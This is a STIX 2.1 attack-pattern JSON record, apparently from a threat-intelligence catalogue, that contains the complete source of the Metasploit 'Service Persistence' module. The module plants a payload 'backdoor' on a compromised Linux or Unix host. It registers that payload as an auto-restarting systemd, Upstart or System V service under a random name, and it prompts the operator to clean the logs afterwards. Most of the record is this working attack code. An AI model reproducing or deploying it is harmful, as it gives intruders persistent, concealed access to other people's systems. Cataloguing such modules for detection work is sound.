{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4e98fa2e-173f-4816-9845-e2cc0750c9cc",
    "created": "2024-08-14T16:58:28.913824Z",
    "modified": "2024-08-14T16:58:28.913828Z",
    "name": "Service Persistence",
    "description": "( This module will create a service on the box, and mark it for auto-restart. We need enough access to write service files and potentially restart services Targets: System V: CentOS <= 5 Debian <= 6 Kali 2.0 Ubuntu <= 9.04 Upstart: CentOS 6 Fedora >= 9, < 15 Ubuntu >= 9.10, <= 14.10 systemd: CentOS 7 Debian >= 7, <=8 Fedora >= 15 Ubuntu >= 15.04 Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/service_persistence.rb",
            "external_id": "service_persistence.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Unix\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Service Persistence',\n        'Description'    => %q(\n          This module will create a service on the box, and mark it for auto-restart.\n          We need enough access to write service files and potentially restart services\n          Targets:\n            System V:\n              CentOS <= 5\n              Debian <= 6\n              Kali 2.0\n              Ubuntu <= 9.04\n            Upstart:\n              CentOS 6\n              Fedora >= 9, < 15\n              Ubuntu >= 9.10, <= 14.10\n            systemd:\n              CentOS 7\n              Debian >= 7, <=8\n              Fedora >= 15\n              Ubuntu >= 15.04\n          Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'h00die <mike@shorebreaksecurity.com>',\n            'Cale Black' # systemd user target\n          ],\n        'Platform'       => ['unix', 'linux'],\n        'Targets'        =>\n          [\n            ['Auto', 'DefaultOptions' =>\n              {\n                'SHELLPATH' => '/usr/local/bin'\n              }\n            ],\n            ['System V', :runlevel => '2 3 4 5', 'DefaultOptions' =>\n              {\n                'SHELLPATH' => '/usr/local/bin'\n              }\n            ],\n            ['Upstart', :runlevel => '2345', 'DefaultOptions' =>\n              {\n                'SHELLPATH' => '/usr/local/bin'\n              }\n            ],\n            ['systemd', 'DefaultOptions' =>\n              {\n                'SHELLPATH' => '/usr/local/bin'\n              }\n            ],\n            ['systemd user', 'DefaultOptions' =>\n              {\n                'SHELLPATH' => '/tmp'\n              }\n            ]\n          ],\n        'DefaultTarget'  => 0,\n        'Arch'           => ARCH_CMD,\n        'References'     =>\n          [\n            ['URL', 'https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples']\n          ],\n        'Payload'        =>\n        {\n          'Compat'     =>\n          {\n            'PayloadType'  => 'cmd',\n            'RequiredCmd'  => 'python netcat' # we need non-threaded/forked so the systems properly detect the service going down\n          }\n        },\n        'DefaultOptions' =>\n          {\n            'WfsDelay' => 5\n          },\n        'DisclosureDate' => '1983-01-01', # system v release date\n      )\n    )\n\n    register_options(\n      [\n        OptPath.new('SHELLPATH', [true, 'Writable path to put our shell', '/usr/local/bin']),\n        OptString.new('SHELL_NAME', [false, 'Name of shell file to write']),\n        OptString.new('SERVICE', [false, 'Name of service to create'])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptBool.new('EnableService', [true, 'Enable the service', true])\n      ]\n    )\n  end\n\n  def exploit\n    backdoor = write_shell(datastore['SHELLPATH'])\n    if backdoor.nil?\n      return\n    end\n    path = backdoor.split('/')[0...-1].join('/')\n    file = backdoor.split('/')[-1]\n    case target.name\n    when 'System V'\n      system_v(path, file, target.opts[:runlevel], service_system_exists?('update-rc.d'))\n    when 'Upstart'\n      upstart(path, file, target.opts[:runlevel])\n    when 'systemd'\n      systemd(path, file)\n    when 'systemd user'\n      systemd_user(path, file)\n    else\n      if service_system_exists?('systemctl')\n        print_status('Utilizing systemd')\n        systemd(path, file)\n      end\n      if service_system_exists?('initctl')\n        print_status('Utilizing Upstart')\n        upstart(path, file, '2345')\n      end\n      has_updatercd = service_system_exists?('update-rc.d')\n      if has_updatercd || service_system_exists?('chkconfig') # centos 5\n        print_status('Utilizing System_V')\n        system_v(path, file, '2 3 4 5', has_updatercd)\n      else\n        print_error('Unable to detect service system')\n        register_file_for_cleanup(backdoor)\n      end\n    end\n  end\n\n  def service_system_exists?(command)\n    service_cmd = cmd_exec(\"which #{command}\")\n    !(service_cmd.empty? || service_cmd.include?('no'))\n  end\n\n  def write_shell(path)\n    file_name = datastore['SHELL_NAME'] ? datastore['SHELL_NAME'] : Rex::Text.rand_text_alpha(5)\n    backdoor = \"#{path}/#{file_name}\"\n    vprint_status(\"Writing backdoor to #{backdoor}\")\n    write_file(backdoor, payload.encoded)\n    if file_exist?(backdoor)\n      cmd_exec(\"chmod 711 #{backdoor}\")\n      backdoor\n    else\n      print_error('File not written, check permissions.')\n      return\n    end\n  end\n\n  def systemd(backdoor_path, backdoor_file)\n    # https://coreos.com/docs/launching-containers/launching/getting-started-with-systemd/\n    script = %{[Unit]\nDescription=Start daemon at boot time\nAfter=\nRequires=\n[Service]\nRestartSec=10s\nRestart=always\nTimeoutStartSec=5\nExecStart=/bin/sh #{backdoor_path}/#{backdoor_file}\n[Install]\nWantedBy=multi-user.target}\n\n    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)\n    service_name = \"/lib/systemd/system/#{service_filename}.service\"\n    vprint_status(\"Writing service: #{service_name}\")\n    write_file(service_name, script)\n    if !file_exist?(service_name)\n      print_error('File not written, check permissions.')\n      return\n    end\n    if datastore['EnableService']\n      vprint_status('Enabling service')\n      cmd_exec(\"systemctl enable #{service_filename}.service\")\n    end\n    vprint_status('Starting service')\n    cmd_exec(\"systemctl start #{service_filename}.service\")\n  end\n\n  def systemd_user(backdoor_path, backdoor_file)\n    script = <<~EOF\n      [Unit]\n      Description=Start daemon at boot time\n      After=\n      Requires=\n      [Service]\n      RemainAfterExit=yes\n      RestartSec=10s\n      Restart=always\n      TimeoutStartSec=5\n      ExecStart=/bin/sh #{backdoor_path}/#{backdoor_file}\n      [Install]\n      WantedBy=default.target\n    EOF\n    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)\n\n    home = cmd_exec('echo ${HOME}')\n    vprint_status(\"Creating user service directory\")\n    cmd_exec(\"mkdir -p #{home}/.config/systemd/user\")\n\n    service_name = \"#{home}/.config/systemd/user/#{service_filename}.service\"\n    vprint_status(\"Writing service: #{service_name}\")\n\n    write_file(service_name, script)\n\n    if !file_exist?(service_name)\n      print_error('File not written, check permissions. Attempting secondary location')\n      vprint_status(\"Creating user secondary service directory\")\n      cmd_exec(\"mkdir -p #{home}/.local/share/systemd/user\")\n\n      service_name = \"#{home}/.local/share/systemd/user/#{service_filename}.service\"\n      vprint_status(\"Writing .local service: #{service_name}\")\n      write_file(service_name, script)\n\n      if !file_exist?(service_name)\n        print_error('File not written, check permissions.')\n        return\n      end\n    end\n\n    # This was taken from pam_systemd(8)\n    systemd_socket_id = cmd_exec('id -u')\n    systemd_socket_dir = \"/run/user/#{systemd_socket_id}\"\n    vprint_status('Reloading manager configuration')\n    cmd_exec(\"XDG_RUNTIME_DIR=#{systemd_socket_dir} systemctl --user daemon-reload\")\n\n    if datastore['EnableService']\n      vprint_status('Enabling service')\n      cmd_exec(\"XDG_RUNTIME_DIR=#{systemd_socket_dir} systemctl --user enable #{service_filename}.service\")\n    end\n\n    vprint_status(\"Starting service: #{service_filename}\")\n    # Prefer restart over start, as it will execute already existing service files\n    cmd_exec(\"XDG_RUNTIME_DIR=#{systemd_socket_dir} systemctl --user restart #{service_filename}\")\n  end\n\n  def upstart(backdoor_path, backdoor_file, runlevel)\n    # http://blog.terminal.com/getting-started-with-upstart/\n    script = %{description \\\"Start daemon at boot time\\\"\nstart on filesystem or runlevel [#{runlevel}]\nstop on shutdown\nscript\n    cd #{backdoor_path}\n    echo $$ > /var/run/#{backdoor_file}.pid\n    exec #{backdoor_file}\nend script\npost-stop exec sleep 10\nrespawn\nrespawn limit unlimited}\n\n    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)\n    service_name = \"/etc/init/#{service_filename}.conf\"\n    vprint_status(\"Writing service: #{service_name}\")\n    write_file(service_name, script)\n    if !file_exist?(service_name)\n      print_error('File not written, check permissions.')\n      return\n    end\n    vprint_status('Starting service')\n    cmd_exec(\"initctl start #{service_filename}\")\n    vprint_status(\"Dont forget to clean logs: /var/log/upstart/#{service_filename}.log\")\n  end\n\n  def system_v(backdoor_path, backdoor_file, runlevel, has_updatercd)\n    if has_updatercd\n      print_status('Utilizing update-rc.d')\n    else\n      print_status('Utilizing chkconfig')\n    end\n    script = %{#!/bin/sh\n### BEGIN INIT INFO\n# Provides: service\n# Required-Start: $network\n# Required-Stop: $network\n# Default-Start:     #{runlevel}\n# Default-Stop:      0 1 6\n# Short-Description: Start daemon at boot time\n# Description:       Enable service provided by daemon.\n### END INIT INFO\ndir=\\\"#{backdoor_path}\\\"\ncmd=\\\"#{backdoor_file}\\\"\nname=`basename $0`\npid_file=\\\"/var/run/$name.pid\\\"\nstdout_log=\\\"/var/log/$name.log\\\"\nstderr_log=\\\"/var/log/$name.err\\\"\nget_pid() {\n    cat \\\"$pid_file\\\"\n}\nis_running() {\n    [ -f \\\"$pid_file\\\" ] && ps `get_pid` > /dev/null 2>&1\n}\ncase \\\"$1\\\" in\n    start)\n    if is_running; then\n        echo \\\"Already started\\\"\n    else\n        echo \\\"Starting $name\\\"\n        cd \\\"$dir\\\"\n}\n\n    if has_updatercd\n      script << \"        sudo $cmd >> \\\"$stdout_log\\\" 2>> \\\"$stderr_log\\\" &\\n\"\n    else # CentOS didn't like sudo or su...\n      script << \"        $cmd >> \\\"$stdout_log\\\" 2>> \\\"$stderr_log\\\" &\\n\"\n    end\n    script << %{        echo $! > \\\"$pid_file\\\"\n        if ! is_running; then\n            echo \\\"Unable to start, see $stdout_log and $stderr_log\\\"\n            exit 1\n        fi\n    fi\n    ;;\n    stop)\n    if is_running; then\n        echo -n \\\"Stopping $name..\\\"\n        kill `get_pid`\n        for i in {1..10}\n        do\n            if ! is_running; then\n                break\n            fi\n            echo -n \\\".\\\"\n            sleep 1\n        done\n        echo\n        if is_running; then\n            echo \\\"Not stopped; may still be shutting down or shutdown may have failed\\\"\n            exit 1\n        else\n            echo \\\"Stopped\\\"\n            if [ -f \\\"$pid_file\\\" ]; then\n                rm \\\"$pid_file\\\"\n            fi\n        fi\n    else\n        echo \\\"Not running\\\"\n    fi\n    ;;\n    restart)\n    $0 stop\n    if is_running; then\n        echo \\\"Unable to stop, will not attempt to start\\\"\n        exit 1\n    fi\n    $0 start\n    ;;\n    status)\n    if is_running; then\n        echo \\\"Running\\\"\n    else\n        echo \\\"Stopped\\\"\n        exit 1\n    fi\n    ;;\n    *)\n    echo \\\"Usage: $0 {start|stop|restart|status}\\\"\n    exit 1\n    ;;\nesac\nexit 0}\n\n    service_filename = datastore['SERVICE'] ? datastore['SERVICE'] : Rex::Text.rand_text_alpha(7)\n    service_name = \"/etc/init.d/#{service_filename}\"\n    vprint_status(\"Writing service: #{service_name}\")\n    write_file(service_name, script)\n    if !file_exist?(service_name)\n      print_error('File not written, check permissions.')\n      return\n    end\n    cmd_exec(\"chmod 755 #{service_name}\")\n    vprint_status('Enabling & starting our service')\n    if has_updatercd\n      cmd_exec(\"update-rc.d #{service_filename} defaults\")\n      cmd_exec(\"update-rc.d #{service_filename} enable\")\n      if file_exist?('/usr/sbin/service') # some systems have update-rc.d but not service binary, have a fallback just in case\n        cmd_exec(\"service #{service_filename} start\")\n      else\n        cmd_exec(\"/etc/init.d/#{service_filename} start\")\n      end\n    else # CentOS\n      cmd_exec(\"chkconfig --add #{service_filename}\")\n      cmd_exec(\"chkconfig #{service_filename} on\")\n      cmd_exec(\"/etc/init.d/#{service_filename} start\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "1983-01-01, # system v release date",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}